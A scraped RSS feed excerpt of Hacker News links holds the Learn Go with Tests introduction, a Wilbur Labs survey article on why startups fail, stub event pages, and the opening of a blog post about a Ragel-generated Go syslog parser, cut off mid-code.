<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div data-editioncontainer="true"><div data-slate-editor="true" data-key="7793c8b1ccbb475595eaddb58cfaf252" autocorrect="on" spellcheck="true" data-gramm="false"><div data-slate-void="true" data-key="a9aa807bf56c459ab2a22bea85b7a16f"><div><figure data-key="a9aa807bf56c459ab2a22bea85b7a16f" contenteditable="false"><div><p><img tabindex="0" src="https://gblobscdn.gitbook.com/assets%2F-L9Tqx5WSaiE4u24Pk05%2F-LmyGcIwYFqlc-kxzIGZ%2F-LXAJRSbtm02phRcFvU4%2Fred-green-blue-gophers-smaller.png?alt=media" loading="lazy"></p></div></figure></div></div><p data-key="20ffffcd31344235924e34b06e61d56a"><span><span data-key="8d6c1d3195cb466b9de9175c3fa0a4da"><span data-offset-key="8d6c1d3195cb466b9de9175c3fa0a4da:0"><span data-slate-zero-width="z">​</span></span></span><a href="https://twitter.com/deniseyu21" target="_blank" rel="noopener noreferrer" data-key="33dcce5d94584b4fadada825158fa76b"><span data-key="0fb327c643db4a1e8efa43e91e22f08d"><span data-offset-key="0fb327c643db4a1e8efa43e91e22f08d:0">Art by Denise</span></span></a><span data-key="a08365662c014b5a97280a790edb6a64"><span data-offset-key="a08365662c014b5a97280a790edb6a64:0"><span data-slate-zero-width="z">​</span></span></span></span></p><p data-key="fef98bda4fd84088a576d177c8f1bd3e"><span><span data-key="006cc491989942989a19073405585023"><span data-offset-key="006cc491989942989a19073405585023:0">I am proud to offer this resource for free, but if you wish to give some appreciation, </span></span><a href="https://twitter.com/quii" target="_blank" rel="noopener noreferrer" data-key="3a77ef711900432ab3d8ab5a5c999e64"><span data-key="84896949de264545ae1a636ae7dc728a"><span data-offset-key="84896949de264545ae1a636ae7dc728a:0">Tweet me @quii</span></span></a><span data-key="4d60c51c8eb544279d04309b231a49b8"><span data-offset-key="4d60c51c8eb544279d04309b231a49b8:0"> or:</span></span></span></p><ul data-key="3c5951214b78474986b612cbe43ddb05"><li></li><li></li></ul><ul data-key="640c2857eb8942d2b4b3c27966d72b88"><li><p data-key="4199f92559894ae3bc3871f649a80caa"><span><span data-key="96d894cad08445428fa6bad836d6bb1d"><span data-offset-key="96d894cad08445428fa6bad836d6bb1d:0">Explore the Go language by writing tests</span></span></span></p></li><li><p data-key="202f6cb4c27c4ed6b67a7eb6ce2c9f29"><span><span data-key="2dc3fd6ee1c44cc6a956cdb2486560c5"><span data-offset-key="2dc3fd6ee1c44cc6a956cdb2486560c5:0"><strong data-slate-leaf="true">Get a grounding with TDD</strong></span><span data-offset-key="2dc3fd6ee1c44cc6a956cdb2486560c5:1">. Go is a good language for learning TDD because it is a simple language to learn and testing is built-in</span></span></span></p></li><li><p data-key="9efd919d966a4f4094f1a2b1ec7adfe3"><span><span data-key="fed4a522f5614cf8ad1ffdec60a4151e"><span data-offset-key="fed4a522f5614cf8ad1ffdec60a4151e:0">Be confident that you'll be able to start writing robust, well-tested systems in Go</span></span></span></p></li></ul><p data-key="874ea5f6c9eb4b0c99c718247aff925b"><span><span data-key="01b62342c84b4258aadf1b3db7d1aac1"><span data-offset-key="01b62342c84b4258aadf1b3db7d1aac1:0">Translations:</span></span></span></p><ul data-key="2c79298162fc4d90a6a180cc11c819e8"><li></li><li></li><li></li></ul><p data-key="9928eb3126f643e2a55b983182eeba87"><span><span data-key="c0207754b56245ad8d5d8b7cb6ef8f00"><span data-offset-key="c0207754b56245ad8d5d8b7cb6ef8f00:0">I have some experience introducing Go to development teams and have tried different approaches as to how to grow a team from some people curious about Go into highly effective writers of Go systems.</span></span></span></p><h2 id="what-didnt-work" data-key="339a46989d5d49048fe605d2235e9089"><p><span><span data-key="75a2e735e00a4b1a839e792c0b38c571"><span data-offset-key="75a2e735e00a4b1a839e792c0b38c571:0">What didn't work</span></span></span><a href="#what-didnt-work" contenteditable="false"><span><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></p></h2><h3 id="read-the-book" data-key="cf2fb5c8c1e2443c870eb51c8443cfa5"><p><span><span data-key="e1fc049683bc4ba0b56f3ee71429eaca"><span data-offset-key="e1fc049683bc4ba0b56f3ee71429eaca:0">Read </span><span data-offset-key="e1fc049683bc4ba0b56f3ee71429eaca:1"><em data-slate-leaf="true">the</em></span><span data-offset-key="e1fc049683bc4ba0b56f3ee71429eaca:2"> book</span></span></span><a href="#read-the-book" contenteditable="false"><span><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></p></h3><p data-key="3d32f806f802479682945b1c3b495499"><span><span data-key="74cfc3ff4ab44e679ce163062faa315a"><span data-offset-key="74cfc3ff4ab44e679ce163062faa315a:0">An approach we tried was to take </span></span><a href="https://www.amazon.co.uk/Programming-Language-Addison-Wesley-Professional-Computing/dp/0134190440" target="_blank" rel="noopener noreferrer" data-key="4716f911d34f4af1a0f732238f973bbf"><span data-key="cf0bfda82fd747f0aa81f6ca78665329"><span data-offset-key="cf0bfda82fd747f0aa81f6ca78665329:0">the blue book</span></span></a><span data-key="985f40c75a244e11a549c8be780bae6d"><span data-offset-key="985f40c75a244e11a549c8be780bae6d:0"> and every week discuss the next chapter along with the exercises.</span></span></span></p><p data-key="06daafb67a3041e09bf95d276655d444"><span><span data-key="5e8dc67e4358459aba8e04adce53b91d"><span data-offset-key="5e8dc67e4358459aba8e04adce53b91d:0">I love this book but it requires a high level of commitment. The book is very detailed in explaining concepts, which is obviously great but it means that the progress is slow and steady - this is not for everyone.</span></span></span></p><p data-key="8ddf31d0d3814029ae484954f4f202ac"><span><span data-key="55a36c84309d4827985f9d9516b202d0"><span data-offset-key="55a36c84309d4827985f9d9516b202d0:0">I found that whilst a small number of people would read chapter X and do the exercises, many people didn't.</span></span></span></p><h3 id="solve-some-problems" data-key="d716fd3755424be9b8bcae25c45c8401"><p><span><span data-key="9e678e1bd3b44157a7a4b0f1864de098"><span data-offset-key="9e678e1bd3b44157a7a4b0f1864de098:0">Solve some problems</span></span></span><a href="#solve-some-problems" contenteditable="false"><span><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></p></h3><p data-key="e57e3d2804a448929cfdcb1e5b0f02d0"><span><span data-key="0911c0538ee8485fb076c6658ced93a1"><span data-offset-key="0911c0538ee8485fb076c6658ced93a1:0">Katas are fun but they are usually limited in their scope for learning a language; you're unlikely to use goroutines to solve a kata.</span></span></span></p><p data-key="eadb5d4c13634c0da086585b62abc8dd"><span><span data-key="6bc436527d7a4bd0a0ddaf9c12a845b2"><span data-offset-key="6bc436527d7a4bd0a0ddaf9c12a845b2:0">Another problem is when you have varying levels of enthusiasm. Some people just learn way more of the language than others and when demonstrating what they have done end up confusing people with features the others are not familiar with.</span></span></span></p><p data-key="2f19835d1f494158ad51febf843ce9e7"><span><span data-key="7c3398bc5cca43309280b9999e4f12bf"><span data-offset-key="7c3398bc5cca43309280b9999e4f12bf:0">This ends up making the learning feel quite </span><span data-offset-key="7c3398bc5cca43309280b9999e4f12bf:1"><em data-slate-leaf="true">unstructured</em></span><span data-offset-key="7c3398bc5cca43309280b9999e4f12bf:2"> and </span><span data-offset-key="7c3398bc5cca43309280b9999e4f12bf:3"><em data-slate-leaf="true">ad hoc</em></span><span data-offset-key="7c3398bc5cca43309280b9999e4f12bf:4">.</span></span></span></p><h2 id="what-did-work" data-key="aa916736b1f64fa9ad6826a234a7068f"><p><span><span data-key="204b6693437c4bb0a1f946561c235d67"><span data-offset-key="204b6693437c4bb0a1f946561c235d67:0">What did work</span></span></span><a href="#what-did-work" contenteditable="false"><span><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></p></h2><p data-key="5cd4251f99d04b5a928e1bf2207bf325"><span><span data-key="60d63560577f4422b61a9b3f8b6ba725"><span data-offset-key="60d63560577f4422b61a9b3f8b6ba725:0">By far the most effective way was by slowly introducing the fundamentals of the language by reading through </span></span><a href="https://gobyexample.com/" target="_blank" rel="noopener noreferrer" data-key="8798ef3cfc884d8a9d907c1baeb4ceec"><span data-key="b037c4bbff934f3e8c78283024214120"><span data-offset-key="b037c4bbff934f3e8c78283024214120:0">go by example</span></span></a><span data-key="25d289d606dd419cbfea2b9c6cf0edbe"><span data-offset-key="25d289d606dd419cbfea2b9c6cf0edbe:0">, exploring them with examples and discussing them as a group. This was a more interactive approach than "read chapter x for homework".</span></span></span></p><p data-key="2d4d8491e74f4b64964cdbdce1597e72"><span><span data-key="157c358dc9e14f40849b5aa1a26a7124"><span data-offset-key="157c358dc9e14f40849b5aa1a26a7124:0">Over time the team gained a solid foundation of the </span><span data-offset-key="157c358dc9e14f40849b5aa1a26a7124:1"><em data-slate-leaf="true">grammar</em></span><span data-offset-key="157c358dc9e14f40849b5aa1a26a7124:2"> of the language so we could then start to build systems.</span></span></span></p><p data-key="93c59156aca44a1681fd3f6b6dc6391b"><span><span data-key="e5df7a317c4445f0b8cac50818e38f85"><span data-offset-key="e5df7a317c4445f0b8cac50818e38f85:0">This to me seems analogous to practicing scales when trying to learn guitar.</span></span></span></p><p data-key="0ba017d055c64e63a074d29069c5702f"><span><span data-key="c18eb2683fb448399a37e5d82a6e8974"><span data-offset-key="c18eb2683fb448399a37e5d82a6e8974:0">It doesn't matter how artistic you think you are, you are unlikely to write good music without understanding the fundamentals and practicing the mechanics.</span></span></span></p><h2 id="what-works-for-me" data-key="309710522565441392a3258f1cb6c96d"><p><span><span data-key="a94231b7ac314b34897fa5ef5d446d4c"><span data-offset-key="a94231b7ac314b34897fa5ef5d446d4c:0">What works for me</span></span></span><a href="#what-works-for-me" contenteditable="false"><span><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></p></h2><p data-key="9d415b19bd2e470b9df7585dc5b20f0e"><span><span data-key="6b09e3cbd85c491eb3b68184ad8475bc"><span data-offset-key="6b09e3cbd85c491eb3b68184ad8475bc:0">When </span><span data-offset-key="6b09e3cbd85c491eb3b68184ad8475bc:1"><em data-slate-leaf="true">I</em></span><span data-offset-key="6b09e3cbd85c491eb3b68184ad8475bc:2"> learn a new programming language I usually start by messing around in a REPL but eventually, I need more structure.</span></span></span></p><p data-key="d292e9c9dcd84c95bceb87c17158b548"><span><span data-key="59ee1261ef9b44d6a2dc66ca7945949e"><span data-offset-key="59ee1261ef9b44d6a2dc66ca7945949e:0">What I like to do is explore concepts and then solidify the ideas with tests. Tests verify the code I write is correct and documents the feature I have learned.</span></span></span></p><p data-key="ac7a7c8c384d4c29ba9d28596c3dee00"><span><span data-key="23f880817d6142c6990447b693cfe289"><span data-offset-key="23f880817d6142c6990447b693cfe289:0">Taking my experience of learning with a group and my own personal way I am going to try and create something that hopefully proves useful to other teams. Learning the fundamentals by writing small tests so that you can then take your existing software design skills and ship some great systems.</span></span></span></p><ul data-key="aa58310fa7f946969706fc277390c857"><li><p data-key="669a915066bb4ef4b0e26c903fcea85e"><span><span data-key="efc86c02ee574fb79cb98b6b48b70d3c"><span data-offset-key="efc86c02ee574fb79cb98b6b48b70d3c:0">People who are interested in picking up Go</span></span></span></p></li><li><p data-key="688527c0601d4909ab89155f6730b605"><span><span data-key="f20fba7847dd4b7393da6bdf40b607e2"><span data-offset-key="f20fba7847dd4b7393da6bdf40b607e2:0">People who already know some Go, but want to explore testing more</span></span></span></p></li></ul><ul data-key="4d1ef2b200d8430c9a21207ed235ab32"><li><p data-key="a0ea79f7efe64758a75cfb3e84c4403f"><span><span data-key="2a0b832bb93047459e1a4fba903b64aa"><span data-offset-key="2a0b832bb93047459e1a4fba903b64aa:0">A computer!</span></span></span></p></li><li></li><li><p data-key="37af48f403c4421b9ac4152ec57f95bf"><span><span data-key="c54e48f5ffb544f29f7c4917055ae0e5"><span data-offset-key="c54e48f5ffb544f29f7c4917055ae0e5:0">A text editor</span></span></span></p></li><li><p data-key="46ba9012146d411496b458527596bd3e"><span><span data-key="32f8de875a124b1bbbc09586f37f856c"><span data-offset-key="32f8de875a124b1bbbc09586f37f856c:0">Some experience with programming. Understanding of concepts like </span><span data-offset-key="32f8de875a124b1bbbc09586f37f856c:1"><code spellcheck="false" data-slate-leaf="true">if</code></span><span data-offset-key="32f8de875a124b1bbbc09586f37f856c:2">, variables, functions etc.</span></span></span></p></li><li><p data-key="cab14f1ef46c444da3c3597d08b55c05"><span><span data-key="b358489e1217472ea9e576c6098fe34e"><span data-offset-key="b358489e1217472ea9e576c6098fe34e:0">Comfortable with using the terminal</span></span></span></p></li></ul><ul data-key="042593f522cf48b2b3d619cfad8064c6"><li><div data-key="d136e7784d7f4e108ecceb09ff0eb5fd"><p data-key="17ba72e9adac42e7833b919c0646d00e"><span><span data-key="af315b8341d14028a5e8f72d38d13921"><span data-offset-key="af315b8341d14028a5e8f72d38d13921:0">Add issues/submit PRs </span></span><a href="https://github.com/quii/learn-go-with-tests" target="_blank" rel="noopener noreferrer" data-key="23ade180a40a48fe855a08bbfdcc6722"><span data-key="6b249fea7afe41d38dda1ae9e57f3e4d"><span data-offset-key="6b249fea7afe41d38dda1ae9e57f3e4d:0">here</span></span></a><span data-key="73ad65f62f0f4eb2ae7978c72cb0177b"><span data-offset-key="73ad65f62f0f4eb2ae7978c72cb0177b:0"> or </span></span><a href="https://twitter.com/quii" target="_blank" rel="noopener noreferrer" data-key="bd09124193b44c5592ad878542b008fd"><span data-key="03c7c8ab24954fe0b73d4653e5785665"><span data-offset-key="03c7c8ab24954fe0b73d4653e5785665:0">tweet me @quii</span></span></a><span data-key="0f98be6fa0554611b827fd29b6d64094"><span data-offset-key="0f98be6fa0554611b827fd29b6d64094:0"><span data-slate-zero-width="z">​</span></span></span></span></p></div></li></ul><p data-key="dff7591fb9d742ec805efe1108a711b1"><span><span data-key="ea2d85c9fc6b41afa96419db998ce39c"><span data-offset-key="ea2d85c9fc6b41afa96419db998ce39c:0"><span data-slate-zero-width="z">​</span></span></span><a href="https://github.com/quii/learn-go-with-tests/tree/dab987d40a6124ba28d44944b9de3f7a74863378/LICENSE.md" target="_blank" rel="noopener noreferrer" data-key="8a83d09bab004571b9a6747c9a8f3897"><span data-key="4eaa3ce544d34d42a55415a7f2ffbeb2"><span data-offset-key="4eaa3ce544d34d42a55415a7f2ffbeb2:0">MIT license</span></span></a><span data-key="23ad4bc45c6846db9a0b17faa2785838"><span data-offset-key="23ad4bc45c6846db9a0b17faa2785838:0"><span data-slate-zero-width="z">​</span></span></span></span></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://quii.gitbook.io/learn-go-with-tests/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26070606</guid>
            <pubDate>Mon, 08 Feb 2021 21:45:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gumroad: Switching from Zoom to Clubhouse]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26070449">thread link</a>) | @vincentmarle
<br/>
February 8, 2021 | https://www.joinclubhouse.com/event/PADW9A1R | <a href="https://web.archive.org/web/*/https://www.joinclubhouse.com/event/PADW9A1R">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.joinclubhouse.com/event/PADW9A1R</link>
            <guid isPermaLink="false">hacker-news-small-sites-26070449</guid>
            <pubDate>Mon, 08 Feb 2021 21:31:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Privacy Engineering Event with VP of Engineering at Signal and Engineer at Zoom]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26070394">thread link</a>) | @giacaglia
<br/>
February 8, 2021 | https://transcend-io.zoom.us/webinar/register/1616128158152/WN_5UYAMb_hTwC563sSJOqdlw | <a href="https://web.archive.org/web/*/https://transcend-io.zoom.us/webinar/register/1616128158152/WN_5UYAMb_hTwC563sSJOqdlw">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<p><label for="timezone">Time Zone:</label>&nbsp;&nbsp;

</p>
</div>
</div></div>]]>
            </description>
            <link>https://transcend-io.zoom.us/webinar/register/1616128158152/WN_5UYAMb_hTwC563sSJOqdlw</link>
            <guid isPermaLink="false">hacker-news-small-sites-26070394</guid>
            <pubDate>Mon, 08 Feb 2021 21:27:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Startups Fail – Lessons from 150 Founders]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26070196">thread link</a>) | @davidkolodny
<br/>
February 8, 2021 | https://www.wilburlabs.com/blueprints/why-startups-fail | <a href="https://web.archive.org/web/*/https://www.wilburlabs.com/blueprints/why-startups-fail">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img alt="visualizing startup failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-01.png"></figure><div><p dir="ltr">Why do startups fail, and what can founders do to prevent it?</p>
<p dir="ltr">Many entrepreneurs and investors opine on this question, but few offer data-driven answers. Our goal is to identify and share clear learnings on this, and the timing could not be more critical.</p>
<p dir="ltr">In 2020, the U.S. Internal Revenue Service received more than 4.4 million applications for new businesses according to the Bureau of Labor Statistics (BLS).<sup>1</sup> In the second, third, and fourth quarters, business formation topped <em>every quarter since 2005</em>. Although COVID-19 has shuttered almost 30% of small businesses, it is simultaneously responsible for the 21st centuryâ€™s greatest surge in entrepreneurship.<sup>2</sup></p>
<p>For would-be founders, thereâ€™s no avoiding the undeniable: sustained success is statistically unlikely. Nearly a fifth of new businesses shut down in their first year according to BLS data.<sup>3</sup> Even with venture backing, a staggering three-quarters of startups fail according to research by Shikhar Ghosh of Harvard Business School.<sup>4 </sup>However, fear of failure shouldnâ€™t prevent anyone from starting a business.</p>
<p dir="ltr">One great way to raise the odds of startup success is to learn from current and past entrepreneurs. Towards that end, Wilbur Labs surveyed more than 150 startup founders about the pressures that threatened their businesses. We also pulled records of 350 startup failures from CB Insights and Autopsy then analyzed them for patterns. The resulting insights can help founders improve their odds of success this year and beyond.</p>
<p dir="ltr">When founders solve significant problems and avoid preventable failures, everyone stands to benefit. In that spirit, weâ€™ll examine why startups fail (i.e., shutdown permanently) and how they overcome potential failures.</p></div><h2>Why Startups Fail</h2><p>About 70% of entrepreneurs will face potential business failure based on our survey of more than 150 founders. Nearly 66% will face this potential failure within 25 months of launching their company. Almost 77% of respondents who faced potential failure said it was due â€” at least in part â€” to COVID-19.</p><figure><img alt="statistic of founders facing business failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-02.png"></figure><p>Based on a novel analysis of data from CB Insights and Autopsy, we identified the reasons that founders cite for failure.<sup>5,6</sup> Keep in mind: this is self-reported data.</p><figure><img alt="most common reasons for startup failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-03.png"></figure><div><p dir="ltr">More than one-third of founders believe that running out of money led to failure. Second to that, founders attribute their failure to a lack of financing or investor interest. In other words, if they managed to generate more revenue, spend less money, and/or raise capital through alternative channels, their startups might have survived.</p>
<p dir="ltr">Running out of money seems related to the third most common reason for failure: no business plan or model. Perhaps founders mistakenly believe that a business plan will slow them down or limit their agility. Or, maybe they expect to exit before thereâ€™s pressure to be profitable. Such founders are likely to bank on their next funding round, an acquisition, or a major enterprise deal for survival. If those donâ€™t materialize, thereâ€™s no plan B.</p>
<p dir="ltr">Although most startups cannot expect to generate profits immediately, they should have a break-even point and a plan to reach it. As former Google CEO Eric Schmidt often says, â€œRevenue solves all known problems.â€� Revenue can also solve <em>unknown</em> problems, as the COVID-19 pandemic has illustrated.</p>
<p dir="ltr">Revenue generation also proves that a startup is solving a significant problem in a sustainable way. If no one will pay for the solution, more financing wonâ€™t necessarily change that. There is simply no better measure of product-market fit and competitiveness than revenue.</p>
<p dir="ltr">Based on the data, strong business planning with an eye towards profitability is the surest way to avoid failure. When Wilbur Labs surveyed 150+ founders about their recommendations for preventing failure, they tended to agree:</p></div><figure><img alt="founder recommendations for preventing startup failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-04.png"></figure><div><p dir="ltr">Nearly 30% of respondents urged founders to do more research prior to launch, while roughly 22% recommended building a stronger business plan. Even though running out of money is the leading cause of failure, relatively few (13.5%) founders recommend financing as a way to prevent that.</p>
<p dir="ltr">In a free-response section where respondents could enter any advice for founders, this theme persisted. A quarter of responses emphasized research, planning, and/or preparation. Only 6% said â€œjust do itâ€� or â€œgo for it.â€�</p>
<p dir="ltr">We encourage founders to look at Wilbur Labsâ€™ Concept Evaluation â€” our version of a business plan â€” which you can view in our post, <a href="https://www.wilburlabs.com/blueprints/how-to-turn-an-idea-into-a-business">How to Turn an Idea Into a Business</a>.</p></div><h2>Reasons for Startup Failure Over Time</h2><p>Launching a business is never easy. But do the dominant causes of failure change over time? To find out, we plotted the prevalence of each reason for failure across the last six years.</p><figure><img alt="reasons for startup failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-05.png"></figure><div><p dir="ltr">Although the causes of startup failure changed significantly in a mere six years, challenges with money and financing remained the top reasons for failure. In fact, they have grown more troublesome since 2014, even as venture investment totals break new records annually.</p>
<p dir="ltr">Venture money is not distributed evenly, however. The National Venture Capital Association (NVCA) and PitchBook note that â€œmega dealsâ€� (venture investments of $100M or more) account for a growing proportion of the total â€” about 45% in 2020, up from 40% in 2019.<sup>7,8 </sup>Unless VCs are lined up to invest, depending on the next venture round is an ever-riskier survival strategy for startups.</p>
<p dir="ltr">Some causes of failure have grown more prevalent since 2014, including a lack of market need. That doesnâ€™t mean the world is running out of startup ideas (see <a href="https://www.wilburlabs.com/blueprints/how-to-get-startup-ideas">How to Get Startup Ideas</a>, a Wilbur Labs post addressing this topic in detail). Rather, that may reflect a lack of cultural, geographic, and socioeconomic diversity among founders and investors. The sense of increasing competition may suggest that too many founders have piled into red oceans without enough differentiation. Notice that a lack of market need and mistimed products spiked <em>only</em> in 2020. COVID-19 throttled startups that could not adapt to socially distanced living.</p>
<p dir="ltr">Either way, long gone are the days when founders could launch an app or product and users would swarm to try it. Thereâ€™s too much noise out there. Solving real problems that serve people better is even more critical now, given the sheer number of products competing daily for attention.</p>
<p dir="ltr">Legal challenges have also been on the rise, perhaps due to increasing regulation of digital companies. Before Europeâ€™s General Data Protection Regulation (GDPR) went into effect in 2018, UK small businesses each spent an average of 600 hours to prepare.<sup>9</sup> Early on in a venture, any distraction from building a product and serving customers can be deadly. Encouragingly, fewer founders say their network, scale, team, UX, marketing, or lack of focus are barriers to success compared to six years ago. Maybe startup development is becoming more professional and systematic. Failure to pivot is another barrier in decline. Nearly 30% of startups reported this being a cause for their failure in 2014, but six years later, just under 15% reported the same. Founders willing to pivot tend to raise their odds of success, as the next set of data demonstrates.</p></div><h2>Startup Founders and Pivot Strategies</h2><p>In our survey of 150 founders, 55% reported pivoting to avoid failure. Less than half felt confident in their likelihood of success when the pivot took place. Even so, nearly 75% of the founders who pivoted said it was successful.</p><figure><img alt="percentage of founders who pivoted" src="https://storage.googleapis.com/wl-blog/images/startup-fail-06.png"></figure><figure><img alt="founders who pivoted and succeeded percentage" src="https://storage.googleapis.com/wl-blog/images/startup-fail-07.png"></figure><div><p dir="ltr">During a pivot, founders should build the plane as they fly it. The team must learn from mistakes, iterate, and adapt quickly â€” before the money runs out. Presumably, founders who invest in identifying and mitigating future risks have better odds of not only pivoting but surviving the process.</p>
<p dir="ltr">But which pivots work and why? Which strategies save companies?</p></div><figure><img alt="most common pivot strategies" src="https://storage.googleapis.com/wl-blog/images/startup-fail-08.png"></figure><div><p dir="ltr">A majority of founders pivoted by updating or improving their business plan. As noted earlier, a bad business plan is the third most common cause of failure and is linked to running out of money, the most frequently reported reason for failure.</p>
<p dir="ltr">Few startups launch with a bulletproof, immutable plan. Rather, successful founders create a plan and improve it continuously as market conditions and customer feedback demand. Changing the business plan can lead to the second and third most popular strategies: improving the existing product or launching a new one.</p>
<p dir="ltr">Almost 13% of founders said they attempted to pivot by securing additional funding or investors. This is a rarer pivot but an important one given how commonly startups fail by running out of money or by failing to secure more funding. While capital-intensive businesses (e.g., clean industrial technologies) may depend on external financing for longer than average, most startups can avoid this dicey pivot by focusing on their business model and revenue. </p></div><h2>Advice From Other Founders</h2><p>The odds are stacked against startups. But by studying other foundersâ€™ mistakes, aspiring entrepreneurs can anticipate and manage preventable failures. With this in mind, Wilbur Labs asked startup founders to indicate the advice they would give to other entrepreneurs.</p><figure><img alt="advice for aspiring startup founders" src="https://storage.googleapis.com/wl-blog/images/startup-fail-09.png"></figure><div><p dir="ltr">The leading suggestions are fundamental rules of startup survival: learn from mistakes, listen to customers, and ensure that there is a market for your product.</p>
<div dir="ltr"><p>Less common but noteworthy is how many founders recommend looking for outside help in the form of legal advice (29%), networking (28%), consultants (28%), and a team with diversified skills (22%). </p><p>Despite the stereotype, successful founders are <em>not</em> rugged individualists living off Walden Pond. They surround themselves with experts and mentors who have encountered and solved the challenges endemic to building any startup. Founders who learn from these advisors can focus on their own vision rather than on reinventing the wheel.</p></div></div><h2>Supporting Startup Success</h2><p>Although failure is disappointing, two-thirds of the founders who faced potential failure would be willing to launch another venture.</p><figure><img alt="founder willingness to start another company" src="https://storage.googleapis.com/wl-blog/images/startup-fail-10.png"></figure><div><p dir="ltr">Having examined …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.wilburlabs.com/blueprints/why-startups-fail">https://www.wilburlabs.com/blueprints/why-startups-fail</a></em></p>]]>
            </description>
            <link>https://www.wilburlabs.com/blueprints/why-startups-fail</link>
            <guid isPermaLink="false">hacker-news-small-sites-26070196</guid>
            <pubDate>Mon, 08 Feb 2021 21:12:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ragel: State machine compiler or a fast way to build fast parser]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26070192">thread link</a>) | @eekhabarov
<br/>
February 8, 2021 | https://dev.ms/2021/01/ragel-state-machine-compiler/ | <a href="https://web.archive.org/web/*/https://dev.ms/2021/01/ragel-state-machine-compiler/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><time datetime="2021-01-25T09:57:37-0500">Mon, Jan 25, 2021</time></p><p>Recently I was working on <code>go-syslog</code><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> package making some changes for a
private project. This package parses incoming Syslog<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> records and returns
structured data.</p><p>My first questions, when I opened a file
<a href="https://github.com/influxdata/go-syslog/blob/develop/rfc3164/machine.go">https://github.com/influxdata/go-syslog/blob/develop/rfc3164/machine.go</a> were:
“What a heck is that?”, “Who is writing in Golang but in C-like style?” and
“How can I read it and make any modifications here?”</p><p>Before making any modifications I have to get a bit understanding how it works.
Everything is completely clear until
<a href="https://github.com/influxdata/go-syslog/blob/develop/rfc3164/machine.go#L97">line:97</a>
where two things start: function <code>machine.Parse</code> and “goto hell”. The function
is <em>8500</em> lines long and mostly consists of labels, <code>goto</code> statements and “magic
numbers”. At that point I had no idea how to deal with it.</p><p>That is how it looks like</p><div><pre><code data-lang="go">	{
		<span>var</span> _widec <span>int16</span>
		<span>if</span> (m.p) <span>==</span> (m.pe) {
			<span>goto</span> _testEof
		}
		<span>switch</span> m.cs {
		<span>case</span> <span>1</span>:
			<span>goto</span> stCase1
		<span>case</span> <span>0</span>:
			<span>goto</span> stCase0
		<span>case</span> <span>2</span>:
			<span>goto</span> stCase2
		<span>case</span> <span>3</span>:
			<span>goto</span> stCase3

<span>//&lt;skipped&gt;
</span><span></span>
		<span>goto</span> tr37
	st104:
		<span>if</span> (m.p)<span>++</span>; (m.p) <span>==</span> (m.pe) {
			<span>goto</span> _testEof104
		}
	stCase104:
